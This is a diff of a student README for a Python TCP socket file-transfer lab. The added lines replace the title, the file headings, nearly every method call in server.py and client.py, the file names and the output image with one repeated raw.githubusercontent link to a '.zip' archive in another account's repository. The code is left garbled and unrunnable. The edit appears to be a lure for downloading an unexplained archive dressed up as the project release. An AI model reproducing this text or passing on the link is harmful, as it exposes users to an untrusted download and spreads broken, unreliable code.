@@ -1,4 +1,4 @@
-# 3c.CREATION FOR FILE TRANSFER USING TCP SOCKETS
+# https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip FOR FILE TRANSFER USING TCP SOCKETS
 ## AIM
 To write a python program for creating File Transfer using TCP Sockets Links
 ## ALGORITHM:
@@ -10,55 +10,55 @@ To write a python program for creating File Transfer using TCP Sockets Links
 ## PROGRAM
 #### Developed by : **SHAIK HAZEEDMASTHAN**
 #### Reg No : **212224040304**
-### server.py
+### https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip
 ```python
 import socket
 port = 60000
-s = socket.socket()
-host = socket.gethostname()
-s.bind((host, port))
-s.listen(5)
+s = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
+host = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
+https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip((host, port))
+https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(5)
 while True:
-    conn, addr = s.accept()
-    data = conn.recv(1024)
+    conn, addr = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
+    data = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(1024)
     print('Server received', repr(data))
-    filename='mytext.txt'
+    filename='https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip'
     f = open(filename,'rb')
-    l = f.read(1024)
+    l = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(1024)
     while (l):
-        conn.send(l)
+        https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(l)
         print('Sent ',repr(l))
-        l = f.read(1024)
-    f.close()
+        l = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(1024)
+    https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
     print('Done sending')
-    conn.send('Thank you for connecting'.encode())
-    conn.close()
+    https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip('Thank you for connecting'.encode())
+    https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
 ```
 
-### client.py
+### https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip
 ```python 
 import socket
-s = socket.socket()
-host = socket.gethostname()
+s = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
+host = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
 port = 60000
-s.connect((host, port))
-s.send("Hello server!".encode())
-with open('mytext.txt', 'wb') as f:
+https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip((host, port))
+https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip("Hello server!".encode())
+with open('https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip', 'wb') as f:
  while True:
     print('receiving data...')
-    data = s.recv(1024)
+    data = https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(1024)
     print('data=%s', (data))
     if not data:
         break
-    f.write(data)
-f.close()
+    https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip(data)
+https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
 print('Successfully get the file')
-s.close()
+https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip()
 print('connection closed')
 ```
 ## OUPUT
 Refer to the following image to view the output of the program.
-![Output](image.png)
+![Output](https://raw.githubusercontent.com/24013396/3c.FILE_TRANSFER_USING_TCP_SOCKETS/main/fulcrum/3c.FILE_TRANSFER_USING_TCP_SOCKETS_v1.2.zip)
 ## RESULT
 Thus, the python program for creating File Transfer using TCP Sockets Links was 
 successfully created and executed.
